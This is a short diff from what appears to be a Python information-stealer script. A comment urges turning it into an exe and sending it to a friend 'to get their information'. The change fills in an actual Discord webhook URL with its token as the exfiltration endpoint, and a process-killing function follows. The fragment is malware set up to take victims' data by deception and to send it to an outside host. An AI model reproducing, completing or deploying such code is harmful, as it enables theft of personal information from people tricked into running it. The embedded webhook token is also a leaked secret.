@@ -7,7 +7,7 @@ import json
 # you can use auto_py_to_exe to convert it to an exe file and send it to your friend to get their information
 
 
-webhook = "your discord webhook"
+webhook = "https://discord.com/api/webhooks/1289943649551126642/YEWB1ffQ7nmevf8ThmFdoQbYkyDikwV3JsJaCEFxNCa9ftLhDv4_IXuCQRg6eg62LWOl"
 
 def check_and_kill_process(process_name):
     try:
